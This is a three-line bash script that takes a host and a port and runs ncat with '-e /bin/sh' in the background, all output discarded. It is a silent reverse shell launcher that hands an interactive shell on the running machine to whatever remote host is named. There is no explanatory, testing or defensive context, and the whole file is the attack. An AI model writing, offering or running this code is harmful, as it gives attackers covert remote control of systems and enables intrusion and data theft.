#!/bin/bash
#$host $port
./ncat "$1" "$2" -e /bin/sh >/dev/null 2>&1 &
